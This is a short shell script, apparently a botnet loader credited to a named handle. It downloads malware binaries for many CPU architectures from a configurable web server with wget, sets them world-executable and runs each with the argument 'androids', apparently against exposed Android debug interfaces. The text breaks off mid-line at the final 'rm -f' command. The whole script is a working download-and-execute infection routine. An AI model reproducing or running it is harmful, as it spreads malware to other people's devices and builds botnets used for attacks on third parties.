#!/bin/sh 
# made by untoldeffects#9919
# CHANGE TO YOUR NET IP
WEBSERVER="1.1.1.1:80"
# CHANGE TO YOUR NET BINS

BINARIES="bins.x86 bins.mips bins.mpsl bins.arm bins.arm5 bins.arm6 bins.arm7 bins.ppc bins.m68k bins.sh4"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O adb
	chmod 777 adb
	./adb androids
done

rm -f "